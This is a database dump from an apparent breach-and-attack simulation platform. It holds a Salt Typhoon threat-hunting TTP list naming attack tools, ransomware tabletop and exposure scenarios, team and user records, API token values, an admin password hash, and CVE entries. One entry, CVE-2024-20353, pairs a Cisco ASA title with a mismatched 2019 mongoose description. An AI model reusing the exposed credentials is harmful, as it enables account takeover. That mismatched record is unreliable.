accounting of ‘what is known’ by cyber defenders. \n\nThe below TTPs have been commonly associated with this threat group and should be used for broad-scope hunting across networks where there is suspicion of a compromise. \n\nTTPs include (but are not limited to):\n\nAbuse of LOLBins \nBITSAdmin \nCertUtil \nPowerShell \nAbuse of WMI for Command Execution \nAbuse of SMB for Lateral Movement \nAbuse of PsExec for Command Execution / Lateral Movement \nOther tools observed include Mimikatz, CobaltStrike, Powercat, etc \nAdditionally, blue teams have observed the group exploiting the below vulnerabilities in public-facing appliances or applications: \n\nCVE-2023-46805/CVE-2024-21887 – Ivanti Secure Connect VPN \nCVE-2023-48788 – Fortinet FortiClient EMS \nCVE-2022-3236 – Sophos Firewall \nMultiple CVEs for Microsoft Exchange relating to ProxyLogon Attack \nVulnerabilities in Apache Tomcat present in QConvergeConsole \nOnce a foothold is gained on a network, researchers have observed the following types of information-gathering and reconnaissance techniques being leveraged by the group: \n\nRetrieving ‘Domain Admin’ group details \nAbuse of “copy.exe” to retrieve remotely hosted payloads \nAbuse of .cab files to mask malicious payloads \nExecution of tools via batch scripts \nAbuse of rar.exe to compress sensitive data prior to exfiltration, especially into directories such as C:\\Users\\Public\\Music \nModification of registry run keys to achieve persistence \nCreation of Windows Services to achieve persistence \nDLL Sideloading attacks designed to escalate privileges by hijacking legitimate application flows \nRaw-reads of NTFS to bypass access controls that may lock or prevent users, even local admins, from viewing certain files. \n\nReference: https://www.fortiguard.com/threat-actor/5557/salt-typhoon, https://www.varonis.com/blog/salt-typhoon		SIMULATION HEADER	SIMULATION FOOTER	no-reply@openbas.io	2026-01-09 14:19:23.439668+00	2026-01-09 14:19:23.439692+00	\N	\N	\N	attack-scenario	high	incident-response	\N	\N	f	\N	t
e21fc071-023e-42cb-8e64-cc56774d0282	EASM Scenario	EASM is a cybersecurity practice focused on discovering, mapping, and continuously monitoring all internet-facing assets of an organization (websites, IP addresses, cloud services, APIs, admin portals, etc.). \n\nThe goal is to take the attacker’s perspective in order to identify vulnerabilities, misconfigurations, or forgotten services before they can be exploited.\n\nKey challenges:\n\n- Eliminating blind spots (shadow IT, unmanaged services)\n-  Detecting vulnerabilities (CVEs) and risky configurations early\n- Maintaining a strong security posture in a constantly evolving IT environment\n\nSimply define an asset using an IP address or FQDN. OpenBAS then performs enumeration just like an attacker would:\n- Identifying open ports and running services\n- Detecting exposed administration portals\n- Checking for known vulnerabilities (CVEs)\n- Highlighting misconfigurations (e.g., default credentials)\n- Findings are correlated and reported, giving clear visibility into external exposure.		SIMULATION HEADER	SIMULATION FOOTER	animation-filigran-se2-obas@filigran.cloud	2026-01-09 14:19:27.500058+00	2026-01-09 14:19:27.500078+00	\N	\N	\N	attack-scenario	high	endpoint-protection	\N	\N	f	\N	t
a0672cc6-82fb-4552-9e7e-6993457ef415	Tabletop Exercise - Akira Ransomware Crisis	The goal of this table-top exercise is to simulate a realistic Akira ransomware crisis impacting a CAC 40 company, focusing on the critical role of communication (especially via email) and clear role expectations throughout the incident lifecycle.\nSpecifically, it aims to:\n- Test and evaluate the company's incident response plan in a simulated environment.\n- Clarify roles and responsibilities of different teams (IT Security, Legal, Communications, Executive Leadership) during a ransomware attack.\n- Assess the effectiveness of internal and external communication strategies in a high-pressure situation.\n- Identify potential gaps and areas for improvement in the company's preparedness for a cyber incident.\n- Practice decision-making processes under the constraints of a ransomware attack.\n- Understand the legal, technical, and communication implications of such an event.\n- Familiarize relevant personnel with the steps involved in responding to a ransomware attack, including initial detection, containment, investigation, recovery, and external communication.		SIMULATION HEADER	SIMULATION FOOTER	animation-prerelease-obas@filigran.cloud	2026-01-09 14:19:28.104549+00	2026-01-09 14:19:28.10457+00	\N	\N	\N	global-crisis	high	incident-response	\N	\N	f	\N	t
3a848ec9-20ee-47eb-b09c-34c59bc55b4b	Test P14 cont	 "Scénario pédagogique OT/IT – laboratoire, simulation non destructive"		SIMULATION HEADER	SIMULATION FOOTER	no-reply@openaev.io	2026-01-15 22:41:15.52868+00	2026-01-16 09:59:08.215482+00	\N	\N	\N	attack-scenario	high	incident-response			f	7f92d0b7-3535-4414-80e8-0eed5c2068e0	f
6d525811-c057-422f-8445-8a36e403994b	Test Scenario			EN-TÊTE DE SIMULATION	PIED DE PAGE DE SIMULATION	no-reply@openaev.io	2026-01-09 14:23:43.34281+00	2026-01-09 15:47:34.966699+00	\N	\N	\N	attack-scenario	high	incident-response			f	7f92d0b7-3535-4414-80e8-0eed5c2068e0	f
\.


--
-- Data for Name: scenarios_documents; Type: TABLE DATA; Schema: public; Owner: user
--

COPY public.scenarios_documents (scenario_id, document_id) FROM stdin;
3a848ec9-20ee-47eb-b09c-34c59bc55b4b	435cc834-6596-4d2c-b240-dc78f5fdb069
3a848ec9-20ee-47eb-b09c-34c59bc55b4b	71c1342f-c1c2-4adf-bdd5-30c160b86759
3a848ec9-20ee-47eb-b09c-34c59bc55b4b	b09e4d2f-74e4-4d02-add7-7b65b078cce1
3a848ec9-20ee-47eb-b09c-34c59bc55b4b	c78ed2d1-dde5-41d9-947e-c2e85e05beee
\.


--
-- Data for Name: scenarios_exercises; Type: TABLE DATA; Schema: public; Owner: user
--

COPY public.scenarios_exercises (scenario_id, exercise_id) FROM stdin;
6d525811-c057-422f-8445-8a36e403994b	377d029e-ce0e-404a-851b-03988fbb3fe2
\.


--
-- Data for Name: scenarios_tags; Type: TABLE DATA; Schema: public; Owner: user
--

COPY public.scenarios_tags (scenario_id, tag_id) FROM stdin;
\.


--
-- Data for Name: scenarios_teams; Type: TABLE DATA; Schema: public; Owner: user
--

COPY public.scenarios_teams (scenario_id, team_id) FROM stdin;
a0672cc6-82fb-4552-9e7e-6993457ef415	50a6792a-5481-4dfd-8484-99b1e223af8c
a0672cc6-82fb-4552-9e7e-6993457ef415	490b511c-a552-4b66-b01e-e61cf3db612a
a0672cc6-82fb-4552-9e7e-6993457ef415	4fe02f59-6a71-471b-a29d-69979a803f58
a0672cc6-82fb-4552-9e7e-6993457ef415	e1c79739-92d4-40ed-9454-89c179e815e5
a0672cc6-82fb-4552-9e7e-6993457ef415	949f7d3e-12a3-4b63-b0d8-dd294cbe48de
a0672cc6-82fb-4552-9e7e-6993457ef415	b1faf8b6-8b9e-4289-a6c5-d17c48bb4e37
a0672cc6-82fb-4552-9e7e-6993457ef415	bb25effa-db8b-43ab-9576-cbca740211e8
a0672cc6-82fb-4552-9e7e-6993457ef415	cf5c5904-18fd-434d-b496-34b741871af8
a0672cc6-82fb-4552-9e7e-6993457ef415	7a2c91a3-5440-410b-ab7d-2f34542acafe
a0672cc6-82fb-4552-9e7e-6993457ef415	e027d525-f8ec-4478-b057-e8728c929d4f
a0672cc6-82fb-4552-9e7e-6993457ef415	4cf815c1-b21f-4de0-a145-3f9e882375f7
a0672cc6-82fb-4552-9e7e-6993457ef415	c261e3ab-ebfa-4dd4-93c1-b67d487893dc
a0672cc6-82fb-4552-9e7e-6993457ef415	5575d604-9d50-43d2-a943-7748cc5962fa
a0672cc6-82fb-4552-9e7e-6993457ef415	fa980a20-ddc3-4ea7-ae4d-e87e4ae9c492
3a848ec9-20ee-47eb-b09c-34c59bc55b4b	7a2c91a3-5440-410b-ab7d-2f34542acafe
3a848ec9-20ee-47eb-b09c-34c59bc55b4b	949f7d3e-12a3-4b63-b0d8-dd294cbe48de
3a848ec9-20ee-47eb-b09c-34c59bc55b4b	279b9f51-48f0-4e3c-bff2-5ce82e9171d9
3a848ec9-20ee-47eb-b09c-34c59bc55b4b	fa980a20-ddc3-4ea7-ae4d-e87e4ae9c492
3a848ec9-20ee-47eb-b09c-34c59bc55b4b	e027d525-f8ec-4478-b057-e8728c929d4f
3a848ec9-20ee-47eb-b09c-34c59bc55b4b	fc6c7234-ce9b-4cd3-afd0-07ded13bef3d
3a848ec9-20ee-47eb-b09c-34c59bc55b4b	e1c79739-92d4-40ed-9454-89c179e815e5
\.


--
-- Data for Name: scenarios_teams_users; Type: TABLE DATA; Schema: public; Owner: user
--

COPY public.scenarios_teams_users (scenario_id, team_id, user_id) FROM stdin;
3a848ec9-20ee-47eb-b09c-34c59bc55b4b	7a2c91a3-5440-410b-ab7d-2f34542acafe	e53bb362-5ed3-498c-a15c-85763ebc32b3
3a848ec9-20ee-47eb-b09c-34c59bc55b4b	7a2c91a3-5440-410b-ab7d-2f34542acafe	f393dbb8-4129-444a-9064-d1947bb0b073
3a848ec9-20ee-47eb-b09c-34c59bc55b4b	949f7d3e-12a3-4b63-b0d8-dd294cbe48de	7c21f77a-6739-44ab-a585-d6e4049c101f
3a848ec9-20ee-47eb-b09c-34c59bc55b4b	279b9f51-48f0-4e3c-bff2-5ce82e9171d9	48e9b45a-c94f-4ec7-b474-d4d42faf13fd
3a848ec9-20ee-47eb-b09c-34c59bc55b4b	fa980a20-ddc3-4ea7-ae4d-e87e4ae9c492	009a9b48-66d0-4b32-b9f4-4d4f641b1409
3a848ec9-20ee-47eb-b09c-34c59bc55b4b	e027d525-f8ec-4478-b057-e8728c929d4f	81a82a2d-e7a0-4ee0-a919-05829e1229dd
3a848ec9-20ee-47eb-b09c-34c59bc55b4b	fc6c7234-ce9b-4cd3-afd0-07ded13bef3d	1b773255-9005-4440-8345-af3fff0d7237
3a848ec9-20ee-47eb-b09c-34c59bc55b4b	e1c79739-92d4-40ed-9454-89c179e815e5	aa37b69e-bab8-4d5d-9b06-5f35907ff1c1
\.


--
-- Data for Name: security_coverage_send_job; Type: TABLE DATA; Schema: public; Owner: user
--

COPY public.security_coverage_send_job (security_coverage_send_job_id, security_coverage_send_job_simulation, security_coverage_send_job_status, security_coverage_send_job_updated_at) FROM stdin;
\.


--
-- Data for Name: security_coverages; Type: TABLE DATA; Schema: public; Owner: user
--

COPY public.security_coverages (security_coverage_id, security_coverage_external_id, security_coverage_scenario, security_coverage_name, security_coverage_description, security_coverage_scheduling, security_coverage_period_start, security_coverage_period_end, security_coverage_labels, security_coverage_attack_pattern_refs, security_coverage_vulnerabilities_refs, security_coverage_content, security_coverage_created_at, security_coverage_updated_at, security_coverage_external_url) FROM stdin;
\.


--
-- Data for Name: tag_rule_asset_groups; Type: TABLE DATA; Schema: public; Owner: user
--

COPY public.tag_rule_asset_groups (tag_rule_id, asset_group_id) FROM stdin;
1a5aa2bc-596f-438e-a566-19de14e55a2e	b672bfa8-ccc5-46e8-9a0e-2744e1c10c75
\.


--
-- Data for Name: tag_rules; Type: TABLE DATA; Schema: public; Owner: user
--

COPY public.tag_rules (tag_rule_id, tag_id) FROM stdin;
1a5aa2bc-596f-438e-a566-19de14e55a2e	eb5571d8-83d1-41fc-982e-36664ce5de49
\.


--
-- Data for Name: tags; Type: TABLE DATA; Schema: public; Owner: user
--

COPY public.tags (tag_id, tag_name, tag_color, tag_created_at, tag_updated_at) FROM stdin;
89530ea3-86d2-49fc-a4ea-0cff60cb7136	vulnerability	#fc9ee9	2026-01-09 14:19:22.895847+00	2026-01-09 14:19:22.895863+00
6578027e-c24c-4762-a6fb-7acfcaa33113	cisco	#be7bf0	2026-01-09 14:19:22.903399+00	2026-01-09 14:19:22.903418+00
eb5571d8-83d1-41fc-982e-36664ce5de49	opencti	#8ed4f9	2026-01-09 14:19:22.912667+00	2026-01-09 14:19:22.912687+00
601897e7-549f-4c3b-bc45-3c5b2e913aaa	source:openaev agent	#001bdb	2026-01-09 14:20:15.835528+00	2026-01-09 14:20:15.835541+00
\.


--
-- Data for Name: teams; Type: TABLE DATA; Schema: public; Owner: user
--

COPY public.teams (team_id, team_name, team_description, team_created_at, team_updated_at, team_organization, team_contextual) FROM stdin;
50a6792a-5481-4dfd-8484-99b1e223af8c	Head of IT	\N	2026-01-09 14:19:28.157527+00	2026-01-09 14:19:28.717523+00	\N	f
490b511c-a552-4b66-b01e-e61cf3db612a	Approved External Spokesperson	\N	2026-01-09 14:19:28.189466+00	2026-01-09 14:19:28.737792+00	\N	f
4fe02f59-6a71-471b-a29d-69979a803f58	Forensic Investigation Firm Contact	\N	2026-01-09 14:19:28.209675+00	2026-01-09 14:19:28.758344+00	\N	f
b1faf8b6-8b9e-4289-a6c5-d17c48bb4e37	Recovery Team Lead	\N	2026-01-09 14:19:28.346397+00	2026-01-09 14:19:28.784313+00	\N	f
bb25effa-db8b-43ab-9576-cbca740211e8	Cyber Insurance Provider Contact	\N	2026-01-09 14:19:28.391101+00	2026-01-09 14:19:28.789589+00	\N	f
cf5c5904-18fd-434d-b496-34b741871af8	Internal Stakeholders (All Employees)	\N	2026-01-09 14:19:28.442873+00	2026-01-09 14:19:28.796922+00	\N	f
4cf815c1-b21f-4de0-a145-3f9e882375f7	CEO	\N	2026-01-09 14:19:28.538691+00	2026-01-09 14:19:28.826459+00	\N	f
c261e3ab-ebfa-4dd4-93c1-b67d487893dc	Executive Leadership Team	\N	2026-01-09 14:19:28.558452+00	2026-01-09 14:19:28.844515+00	\N	f
5575d604-9d50-43d2-a943-7748cc5962fa	Media Outlets	\N	2026-01-09 14:19:28.587004+00	2026-01-09 14:19:28.852692+00	\N	f
7a2c91a3-5440-410b-ab7d-2f34542acafe	IT Security Team	Détection, analyse, containment, forensics	2026-01-09 14:19:28.464967+00	2026-01-16 08:18:43.533171+00	\N	f
949f7d3e-12a3-4b63-b0d8-dd294cbe48de	IT Security Lead (RSSI)	Leadership crise, coordination stratégique	2026-01-09 14:19:28.273448+00	2026-01-16 08:20:51.468327+00	\N	f
279b9f51-48f0-4e3c-bff2-5ce82e9171d9	Équipe Biomedical	 Opérateurs terrain, interventions physiques urgentes	2026-01-16 06:55:09.304386+00	2026-01-16 08:21:30.140827+00	\N	f
fa980a20-ddc3-4ea7-ae4d-e87e4ae9c492	Data Protection Authority 	Conformité RGPD, notification violations	2026-01-09 14:19:28.704527+00	2026-01-16 08:22:35.794087+00	\N	f
e027d525-f8ec-4478-b057-e8728c929d4f	Legal Counsel	Obligations légales, risk assessment juridique	2026-01-09 14:19:28.500445+00	2026-01-16 08:23:27.479311+00	\N	f
fc6c7234-ce9b-4cd3-afd0-07ded13bef3d	Responsable Lab	Direction laboratoire, décisions scientifiques/patients	2026-01-16 06:54:19.38826+00	2026-01-16 08:24:19.027559+00	\N	f
e1c79739-92d4-40ed-9454-89c179e815e5	Head of Communications	Gestion médias, communication patients/externe	2026-01-09 14:19:28.224967+00	2026-01-16 08:25:14.682647+00	\N	f
\.


--
-- Data for Name: teams_tags; Type: TABLE DATA; Schema: public; Owner: user
--

COPY public.teams_tags (team_id, tag_id) FROM stdin;
\.


--
-- Data for Name: tokens; Type: TABLE DATA; Schema: public; Owner: user
--

COPY public.tokens (token_id, token_user, token_value, token_created_at) FROM stdin;
ee62d993-a651-4843-bb25-4c4c2b438d94	45ffaff5-942c-47e7-9f43-ff45ce3dabda	69bc72f0-1da7-4301-8cc5-590cb6783435	2026-01-09 14:19:22.707647+00
0d17ce9a-f3a8-4c6d-9721-c98dc3dc023f	89206193-dbfb-4513-a186-d72c037dda4c	fd724d18-3854-426d-b20b-4b92f9b9f430	2026-01-09 14:19:22.866561+00
0aaf753b-36aa-4259-be80-25a6b846a270	f393dbb8-4129-444a-9064-d1947bb0b073	94829499-6c8b-449a-9324-927a81e5f9e3	2026-01-16 08:17:14.976106+00
cf08d546-b114-44b6-9652-bae8e38d5c1a	e53bb362-5ed3-498c-a15c-85763ebc32b3	7b66eb13-dd21-4551-9bfb-a71aabc079ea	2026-01-16 08:18:37.341323+00
c91e63f3-8f2e-4b2a-8066-018e8a180f60	7c21f77a-6739-44ab-a585-d6e4049c101f	63540ff5-a52f-4c3d-a69f-eb8b7cacf665	2026-01-16 08:19:44.167673+00
2be1f424-3616-4209-9be0-f814a8a1c4ce	48e9b45a-c94f-4ec7-b474-d4d42faf13fd	4038185b-ca04-4bc3-90ba-ffcf757d584d	2026-01-16 08:20:28.750328+00
742eebb4-2009-4f6b-a5c1-ef53d06b3250	009a9b48-66d0-4b32-b9f4-4d4f641b1409	a5bcaf40-b44a-4000-913d-e960e2566a6b	2026-01-16 08:22:33.637919+00
8f36ebe4-362c-440a-b5b2-6258d72431b6	81a82a2d-e7a0-4ee0-a919-05829e1229dd	2956ea7b-7a21-4e9a-a3d2-de35f0b5122f	2026-01-16 08:23:20.342064+00
3978d6f2-991b-43bd-8d91-b5752d06f167	1b773255-9005-4440-8345-af3fff0d7237	990481aa-4920-48e8-aa1f-faf1e1f9a843	2026-01-16 08:24:14.485271+00
a889a012-62f8-4cfa-8dca-c6a5ad9c42e7	aa37b69e-bab8-4d5d-9b06-5f35907ff1c1	7937b839-d655-432f-a363-13c18c0d1c0b	2026-01-16 08:25:13.170104+00
\.


--
-- Data for Name: users; Type: TABLE DATA; Schema: public; Owner: user
--

COPY public.users (user_id, user_organization, user_firstname, user_lastname, user_email, user_phone, user_phone2, user_pgp_key, user_password, user_admin, user_status, user_lang, user_created_at, user_updated_at, user_country, user_city, user_theme) FROM stdin;
45ffaff5-942c-47e7-9f43-ff45ce3dabda	\N	OpenAEV Coverage	OpenCTI Connector	connector-68949a7b-c1c2-4649-b3de-7db804ba02bb@openaev.invalid	\N	\N	\N	\N	f	1	auto	2026-01-09 14:19:22.533591+00	2026-01-09 14:19:22.533594+00	\N	\N	default
89206193-dbfb-4513-a186-d72c037dda4c	\N	admin	openaev	dinh_huy.nguyen@insa-cvl.fr	\N	\N	\N	$argon2id$v=19$m=16384,t=2,p=1$pE871hGzEmefFgy0ZXJJ4A$RZwn/jgxMqPVZ/pDGvqOF1YnnMlcaZIYgwHVsBUztdY	t	1	\N	2026-01-09 14:19:22.487905+00	2026-01-09 14:19:22.487905+00	\N	\N	\N
f393dbb8-4129-444a-9064-d1947bb0b073	\N	Admin	Réseau	admin.reseau@lab.local	+33 1 23 45 67 89	\N	\N	\N	f	0	auto	2026-01-16 08:17:14.965163+00	2026-01-16 08:17:14.965164+00	FRA	\N	default
e53bb362-5ed3-498c-a15c-85763ebc32b3	\N	Analyste	SOC	analyste.soc@lab.local	\N	\N	\N	\N	f	0	auto	2026-01-16 08:18:37.33755+00	2026-01-16 08:18:37.337552+00	FRA	\N	default
7c21f77a-6739-44ab-a585-d6e4049c101f	\N	Chief	RSSI	rssi@lab.local	\N	\N	\N	\N	f	0	auto	2026-01-16 08:19:44.160676+00	2026-01-16 08:19:44.160677+00	FRA	\N	default
48e9b45a-c94f-4ec7-b474-d4d42faf13fd	\N	Ingénieur	Biomedical	biomedical@lab.local	\N	\N	\N	\N	f	0	auto	2026-01-16 08:20:28.744422+00	2026-01-16 08:20:28.744423+00	FRA	\N	default
009a9b48-66d0-4b32-b9f4-4d4f641b1409	\N	Data	Protection	dpo@lab.local	\N	\N	\N	\N	f	0	auto	2026-01-16 08:22:33.634011+00	2026-01-16 08:22:33.634012+00	FRA	\N	default
81a82a2d-e7a0-4ee0-a919-05829e1229dd	\N	Conseiller	Juridique	juridique@lab.local	\N	\N	\N	\N	f	0	auto	2026-01-16 08:23:20.33696+00	2026-01-16 08:23:20.336962+00	FRA	\N	default
1b773255-9005-4440-8345-af3fff0d7237	\N	Directeur	Laboratoire	directeur@lab.local	\N	\N	\N	\N	f	0	auto	2026-01-16 08:24:14.481174+00	2026-01-16 08:24:14.481176+00	FRA	\N	default
aa37b69e-bab8-4d5d-9b06-5f35907ff1c1	\N	Responsable	Communication	communication@lab.local	\N	\N	\N	\N	f	0	auto	2026-01-16 08:25:13.165549+00	2026-01-16 08:25:13.16555+00	FRA	\N	default
\.


--
-- Data for Name: users_groups; Type: TABLE DATA; Schema: public; Owner: user
--

COPY public.users_groups (group_id, user_id) FROM stdin;
0b4db570-fdf4-44e9-8daa-39130189fec8	45ffaff5-942c-47e7-9f43-ff45ce3dabda
\.


--
-- Data for Name: users_tags; Type: TABLE DATA; Schema: public; Owner: user
--

COPY public.users_tags (user_id, tag_id) FROM stdin;
\.


--
-- Data for Name: users_teams; Type: TABLE DATA; Schema: public; Owner: user
--

COPY public.users_teams (team_id, user_id) FROM stdin;
7a2c91a3-5440-410b-ab7d-2f34542acafe	f393dbb8-4129-444a-9064-d1947bb0b073
7a2c91a3-5440-410b-ab7d-2f34542acafe	e53bb362-5ed3-498c-a15c-85763ebc32b3
949f7d3e-12a3-4b63-b0d8-dd294cbe48de	7c21f77a-6739-44ab-a585-d6e4049c101f
279b9f51-48f0-4e3c-bff2-5ce82e9171d9	48e9b45a-c94f-4ec7-b474-d4d42faf13fd
fa980a20-ddc3-4ea7-ae4d-e87e4ae9c492	009a9b48-66d0-4b32-b9f4-4d4f641b1409
e027d525-f8ec-4478-b057-e8728c929d4f	81a82a2d-e7a0-4ee0-a919-05829e1229dd
fc6c7234-ce9b-4cd3-afd0-07ded13bef3d	1b773255-9005-4440-8345-af3fff0d7237
e1c79739-92d4-40ed-9454-89c179e815e5	aa37b69e-bab8-4d5d-9b06-5f35907ff1c1
\.


--
-- Data for Name: variables; Type: TABLE DATA; Schema: public; Owner: user
--

COPY public.variables (variable_id, variable_key, variable_value, variable_description, variable_type, variable_exercise, variable_created_at, variable_updated_at, variable_scenario) FROM stdin;
70611c04-4a16-4697-b938-0f2ff1998a81	company_name	[Company Name]	Will be used to refer to the targeted company in inject content	String	\N	2026-01-09 14:19:31.577688+00	2026-01-09 14:19:31.577722+00	a0672cc6-82fb-4552-9e7e-6993457ef415
1a04c654-fadc-4161-a119-23b4c1a6c479	it_security_lead_name	[IT Security Lead Name]	Will be used to refer to the IT Security Lead in inject content	String	\N	2026-01-09 14:19:31.579023+00	2026-01-09 14:19:31.579026+00	a0672cc6-82fb-4552-9e7e-6993457ef415
d3371441-244c-4d67-963f-479b453d72fe	head_of_it_name	[Head of IT name]	Will be used to refer to the Head of IT in inject content	String	\N	2026-01-09 14:19:31.579322+00	2026-01-09 14:19:31.579324+00	a0672cc6-82fb-4552-9e7e-6993457ef415
613d61ac-2106-418c-9e8b-da57fa29ada1	legal_counsel_name	 [Legal Counsel Name]	Will be used to refer to the Legal Counsel in inject content	String	\N	2026-01-09 14:19:31.579436+00	2026-01-09 14:19:31.579437+00	a0672cc6-82fb-4552-9e7e-6993457ef415
535bf096-a2d7-4622-a86e-c2281a076f50	spokesperson_name	[Spokesperson Name]	Will be used to refer to the Spokesperson  in inject content	String	\N	2026-01-09 14:19:31.579516+00	2026-01-09 14:19:31.579517+00	a0672cc6-82fb-4552-9e7e-6993457ef415
4a71306b-2bc2-4d75-89ba-8ebdbb339b6c	insurance_company_name	[Insurance Company Name]	Will be used to refer to the Insurance Company in inject content	String	\N	2026-01-09 14:19:31.579595+00	2026-01-09 14:19:31.579596+00	a0672cc6-82fb-4552-9e7e-6993457ef415
c6005c9e-5ee2-4c9b-8310-d3e488deb843	recovery_team_lead_name	[Recovery Team Lead Name]	Will be used to refer to the Recovery Team Lead in inject content	String	\N	2026-01-09 14:19:31.579683+00	2026-01-09 14:19:31.579684+00	a0672cc6-82fb-4552-9e7e-6993457ef415
56813f62-c773-4bd3-aebc-b87277afa44f	dpa_contact	[DPA Contact]	Will be used to refer to the Data Protection Authority (DPA) in inject content	String	\N	2026-01-09 14:19:31.583641+00	2026-01-09 14:19:31.583644+00	a0672cc6-82fb-4552-9e7e-6993457ef415
\.


--
-- Data for Name: vulnerabilities; Type: TABLE DATA; Schema: public; Owner: user
--

COPY public.vulnerabilities (vulnerability_id, vulnerability_external_id, vulnerability_source_identifier, vulnerability_published, vulnerability_description, vulnerability_vuln_status, vulnerability_cvss_v31, vulnerability_cisa_exploit_add, vulnerability_cisa_action_due, vulnerability_cisa_required_action, vulnerability_cisa_vulnerability_name, vulnerability_remediation, vulnerability_created_at, vulnerability_updated_at) FROM stdin;
9cf962a8-2e76-49ea-acf0-0bd2b49e1741	CVE-2021-26855	CVE-2021-26855	2021-03-02 00:00:00+00	Microsoft Exchange Server ProxyLogon SSRF leading to RCE.	ANALYZED	9.8	2021-03-02 00:00:00+00	2021-03-02 00:00:00+00	Apply updates per vendor instructions	Microsoft Exchange Server Remote Code Execution Vulnerability	\N	2026-01-09 14:18:39.861122+00	2026-01-09 14:18:39.861122+00
35989644-d24d-4357-8d0d-583b8bf2945d	CVE-2023-20198	CVE-2023-20198	2023-10-16 00:00:00+00	Cisco IOS XE Web UI remote code execution via unauthenticated command injection.	ANALYZED	10.0	2023-10-16 00:00:00+00	2023-10-16 00:00:00+00	Verify compliance with BOD 23‑02 and apply mitigations.	Cisco IOS XE Web UI Privilege Escalation Vulnerability	\N	2026-01-09 14:18:39.861122+00	2026-01-09 14:18:39.861122+00
ef44ad31-dea3-44f0-9d06-069971462f8b	CVE-2023-46805	CVE-2023-46805	2024-01-12 00:00:00+00	Ivanti Connect Secure/Policy Secure gateway authentication bypass.	ANALYZED	8.2	2024-01-12 00:00:00+00	2024-01-12 00:00:00+00	Apply mitigations per vendor instructions or discontinue product if unavailable.	Ivanti Connect Secure and Policy Secure Authentication Bypass Vulnerability	\N	2026-01-09 14:18:39.861122+00	2026-01-09 14:18:39.861122+00
02956edf-a9b2-4c74-89da-cac902cc712e	CVE-2023-48788	CVE-2023-48788	2023-12-01 00:00:00+00	Improper neutralization of SQL elements in Fortinet FortiClientEMS allows RCE/commands.	ANALYZED	9.8	2023-12-01 00:00:00+00	2023-12-01 00:00:00+00	Apply mitigations per vendor instructions or discontinue product if unavailable.	Fortinet FortiClient EMS SQL Injection Vulnerability	\N	2026-01-09 14:18:39.861122+00	2026-01-09 14:18:39.861122+00
fc600439-95d0-441e-90ba-ea3fe5c85ac0	CVE-2024-20353	CVE-2024-20353	2019-06-10 00:00:00+00	Use-after-free in mongoose.c (mg_http_get_proto_data) leading to DoS or RCE.	ANALYZED	8.6	2019-06-10 00:00:00+00	2019-06-10 00:00:00+00	Apply mitigations per vendor instructions or discontinue product if unavailable.	Cisco ASA and FTD Denial of Service Vulnerability	\N	2026-01-09 14:18:39.861122+00	2026-01-09 14:18:39.861122+00
e0fc9cc7-798d-4820-a772-c46d85bf1494	CVE-2018-0171	CVE-2018-0171	2018-05-14 00:00:00+00	Cisco Smart Install buffer overflow leading to RCE/DoS.	ANALYZED	9.8	2018-05-14 00:00:00+00	2018-05-14 00:00:00+00	Apply mitigations per vendor instructions or discontinue product if unavailable.	Cisco IOS and IOS XE Software Smart Install Remote Code Execution Vulnerability	\N	2026-01-09 14:18:39.861122+00	2026-01-09 14:18:39.861122+00
33253389-63c1-4723-92a6-5888e306ff2a	CVE-2023-20273	CVE-2023-20273	2023-10-16 00:00:00+00	Cisco IOS XE Web UI insufficient input validation leading to root command injection.	ANALYZED	7.2	2023-10-16 00:00:00+00	2023-10-16 00:00:00+00	Verify compliance with BOD 23‑02 and apply mitigations.	Cisco IOS XE Web UI Command Injection Vulnerability	\N	2026-01-09 14:18:39.861122+00	2026-01-09 14:18:39.861122+00
\.


--
-- Data for Name: vulnerabilities_cwes; Type: TABLE DATA; Schema: public; Owner: user
--

COPY public.vulnerabilities_cwes (vulnerability_id, cwe_id) FROM stdin;
9cf962a8-2e76-49ea-acf0-0bd2b49e1741	14934e8b-f131-46ee-b2c9-ec722d96ada3
35989644-d24d-4357-8d0d-583b8bf2945d	95524e88-cd6e-4110-beed-f7c2f4956971
ef44ad31-dea3-44f0-9d06-069971462f8b	773982ea-ae46-4da6-99e9-300f46bf4cdd
02956edf-a9b2-4c74-89da-cac902cc712e	ff2c6388-dc11-4f7a-bf1d-8bd8befd89be
fc600439-95d0-441e-90ba-ea3fe5c85ac0	86e85188-cc74-4699-9c04-d116079636dd
e0fc9cc7-798d-4820-a772-c46d85bf1494	f6be365e-d04d-4228-8ffa-07f0bb787da0
33253389-63c1-4723-92a6-5888e306ff2a	f3383292-d488-457b-a7d2-a708a3065f94
\.


--
-- Data for Name: vulnerability_reference_urls; Type: TABLE DATA; Schema: public; Owner: user
--

COPY public.vulnerability_reference_urls (vulnerability_id, vulnerability_reference_url) FROM stdin;
9cf962a8-2e76-49ea-acf0-0bd2b49e1741	https://portal.msrc.microsoft.com/en-US/security-guidance/advisory/CVE-2021-26855
9cf962a8-2e76-49ea-acf0-0bd2b49e1741	http://packetstormsecurity.com/files/161938/Microsoft-Exchange-ProxyLogon-Remote-Code-Execution.html
9cf962a8-2e76-49ea-acf0-0bd2b49e1741	https://nvd.nist.gov/vuln/detail/CVE-2021-26855
35989644-d24d-4357-8d0d-583b8bf2945d	https://sec.cloudapps.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-iosxe-webui-privesc-j22SaA4z
35989644-d24d-4357-8d0d-583b8bf2945d	https://nvd.nist.gov/vuln/detail/CVE-2023-20198
35989644-d24d-4357-8d0d-583b8bf2945d	https://github.com/W01fh4cker/CVE-2023-20198-RCE
ef44ad31-dea3-44f0-9d06-069971462f8b	https://nvd.nist.gov/vuln/detail/CVE-2023-46805
ef44ad31-dea3-44f0-9d06-069971462f8b	https://www.twingate.com/blog/tips/cve-2023-46805
02956edf-a9b2-4c74-89da-cac902cc712e	https://nvd.nist.gov/vuln/detail/CVE-2023-48788
fc600439-95d0-441e-90ba-ea3fe5c85ac0	https://github.com/insi2304/mongoose-6.13-fuzz/blob/master/Simplest_Web_Server_Use_After_Free-read-mg_http_get_proto_data5932.png
e0fc9cc7-798d-4820-a772-c46d85bf1494	https://nvd.nist.gov/vuln/detail/CVE-2018-0171
33253389-63c1-4723-92a6-5888e306ff2a	https://sec.cloudapps.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-iosxe-webui-privesc-j22SaA4z
\.


--
-- Data for Name: widgets; Type: TABLE DATA; Schema: public; Owner: user
--

COPY public.widgets (widget_id, widget_type, widget_config, widget_layout, widget_custom_dashboard, widget_created_at, widget_updated_at) FROM stdin;
